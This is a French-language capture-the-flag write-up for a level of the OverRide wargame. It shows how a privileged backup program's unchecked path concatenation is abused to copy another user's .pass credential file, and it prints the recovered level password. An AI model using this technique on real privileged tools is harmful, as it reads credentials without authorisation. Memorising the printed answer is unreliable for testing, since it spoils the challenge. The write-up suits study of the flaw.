Dans ce level, le principe du programme est d'effectuer un backup d'un file passer en argument dans un directory __backups__.


Exemple 

```bash
cd /tmp
mkdir backups
ls
	backups
echo bonjour > test
ls
	backups  test
~/level08 test
cat ./backups/test
	bonjour
```

On constate que le file __test__ a bien etait copier dans le directory __backups__ dans __/tmp__

On vas essayer d'utiliser le meme principe pour copier le __.pass__ du level09.

```bash
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

On ce rend compte que le programe n'arrive pas a ouvrir le le file .pass dans backups. voici pourquoi:

```c
snprintf(dest, sizeof(dest), "./backups/%s", argv[1]);
fd = open(dest, O_WRONLY | O_CREAT | O_TRUNC, 0640);
```

c'est deux ligne dans le programme fond l'ouverture du file. Du coup on peux constater que le programme essaye d'ouvrir __.pass__ dans __./backups/home/users/level09/__

Sauf que les directory n'existe pas.

du coup il nous suffit donc de les créer:

```bash
mkdir -p ./backups/home/users/level09
~/level08 /home/users/level09/.pass
cat ./backups/home/users/level09/.pass
	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

```